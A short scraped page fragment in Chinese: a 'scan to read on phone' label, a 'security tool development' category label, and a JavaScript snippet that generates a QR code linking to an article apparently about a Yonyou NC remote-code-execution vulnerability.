手机扫码阅读

安全工具开发


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-nc-OAUserAuthenticationServlet-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 